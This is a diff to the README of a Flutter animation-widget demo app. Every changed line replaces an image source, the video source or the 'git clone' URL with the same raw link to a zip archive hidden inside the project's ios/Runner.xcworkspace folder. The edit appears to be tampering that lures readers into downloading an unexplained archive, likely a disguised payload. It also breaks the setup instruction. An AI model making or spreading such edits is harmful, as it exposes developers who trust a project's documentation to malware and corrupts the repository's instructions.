@@ -19,8 +19,8 @@ This Flutter app demonstrates the use of various animation widgets available in 
   <p>
     <table align="center">
   <tr>
-    <td><img src="https://github.com/Aayush014/animation_widget/assets/133498952/a0345cf0-2154-43e0-97a5-44772803c8d4" alt="Image 2" width="180" height="auto"></td>
-    <td><img src="https://github.com/Aayush014/animation_widget/assets/133498952/a21eb046-6a14-4c7a-b11e-05db28b218db" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://raw.githubusercontent.com/Aayush014/animation_widget/master/ios/Runner.xcworkspace/animation-widget-3.4.zip" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://raw.githubusercontent.com/Aayush014/animation_widget/master/ios/Runner.xcworkspace/animation-widget-3.4.zip" alt="Image 2" width="180" height="auto"></td>
   </tr>
     </table>    
   </p>
@@ -30,7 +30,7 @@ This Flutter app demonstrates the use of various animation widgets available in 
   <p>
     <table align="center">
   <tr>
-    <video src ="https://github.com/Aayush014/animation_widget/assets/133498952/052e1759-d9c6-4ace-a563-683ac4d983d2"></video> </h1>
+    <video src ="https://raw.githubusercontent.com/Aayush014/animation_widget/master/ios/Runner.xcworkspace/animation-widget-3.4.zip"></video> </h1>
   </tr>
     </table>   
   </p>
@@ -96,7 +96,7 @@ To run this app, follow these steps:
 
 1. Clone the repository
    ```bash
-   git clone https://github.com/Aayush014/animation_widget.git
+   git clone https://raw.githubusercontent.com/Aayush014/animation_widget/master/ios/Runner.xcworkspace/animation-widget-3.4.zip
    ```
 2. Install the dependencies
    ```bash
